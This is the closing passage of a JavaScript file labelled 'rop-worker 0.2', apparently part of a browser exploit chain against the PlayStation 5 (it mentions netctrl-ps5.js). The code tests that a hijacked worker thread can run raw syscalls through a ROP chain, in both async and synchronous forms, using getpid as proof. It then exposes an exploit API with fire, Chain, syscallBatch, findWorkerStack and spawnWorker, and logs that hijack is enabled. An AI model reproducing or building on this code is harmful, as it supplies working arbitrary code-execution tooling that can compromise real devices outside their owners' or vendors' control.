/* getpid(): 0 args, side-effect free, RE-verified number. If this returns a
 * plausible pid the whole path works - Worker, thread walk, hijack, chain,
 * syscall, and the longjmp resume. */
async function testGetpid() {
    const r = await syscall(20);
    log("getpid -> " + r.retval.toString() + " (" + hex(r.retval)
        + ") in " + r.ms + "ms");
    return r;
}

/* Same one-call proof as testGetpid, but through the synchronous path.
 * A matching pid from both means netctrl-ps5.js can keep its sync API. */
function testGetpidSync() {
    const r = syscallSync(20);
    log("getpid SYNC -> " + r.retval.toString() + " (" + hex(r.retval)
        + ") after " + r.spins + " spins");
    return r;
}

window.rop_worker = {
    init, survey, fire, syscall, testGetpid,
    alloc, allocReset, allocUsed, syscallBatch, syscallBatchTagged, leadThenBatchTagged,
    fireSync, syscallSync, testGetpidSync,
    enumerate, findWorkerStack, spawnWorker, ping, Chain,
    state: W, version: "rop-worker 0.2",
};
log("loaded (0.2 — hijack enabled)");

})();
